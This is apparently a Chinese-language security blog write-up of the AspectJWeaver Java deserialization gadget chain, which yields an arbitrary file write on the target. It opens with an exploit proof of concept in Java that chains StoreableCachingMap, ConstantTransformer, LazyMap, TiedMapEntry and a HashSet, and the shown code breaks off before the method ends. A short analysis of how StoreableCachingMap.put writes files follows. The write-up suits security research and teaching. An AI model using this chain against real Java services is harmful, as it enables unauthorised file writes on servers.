# AspectJWeaver

AspectWeaver时java语言的AOP实现，很多语法已经成为AOP领域的标准。本条链子是一条任意文件写入的利用链。但是`non RCE`,在上次的d3ctf中已经起飞了。

## exp

```java
public class AspectJWeaver {

	public static void main(String[] args) throws Exception {

		String fileName    = "123.txt";
		String filePath    = "/Users/phoebe/Downloads";
		String fileContent = "su18 is here";

		// 初始化 HashMap
		HashMap<Object, Object> hashMap = new HashMap<>();

		// 实例化  StoreableCachingMap 类
		Class<?>       c           = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
		Constructor<?> constructor = c.getDeclaredConstructor(String.class, int.class);
		constructor.setAccessible(true);
		Map map = (Map) constructor.newInstance(filePath, 10000);

		// 初始化一个 Transformer，使其 transform 方法返回要写出的 byte[] 类型的文件内容
		Transformer transformer = new ConstantTransformer(fileContent.getBytes(StandardCharsets.UTF_8));

		// 使用 StoreableCachingMap 创建 LazyMap 并引入 TiedMapEntry
		Map          lazyMap = LazyMap.decorate(map, transformer);
		TiedMapEntry entry   = new TiedMapEntry(lazyMap, fileName);

		// entry 放到 HashSet 中
		HashSet set = SerializeUtil.generateHashSet(entry);
```



## 分析

### SimpleCache$StoreableCachingMap

可以看到这个类的put方法，会将key和value，来作为参数调用write

![image-20220515103646076](https://img.dem0dem0.top/images/image-20220515103646076.png)

所以如果可以的话

```java
Class<?>       c           = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
Constructor<?> constructor = c.getDeclaredConstructor(String.class, int.class);
constructor.setAccessible(true);
HashMap<String, Object> map = (HashMap) constructor.newInstance("/tmp/", 10000);
map.put("123.txt", "aaa".getBytes(StandardCharsets.UTF_8));
```

### LazyMap

我们在CC链中，我们通过它来触发transform方法，但是他在后面会调用put.

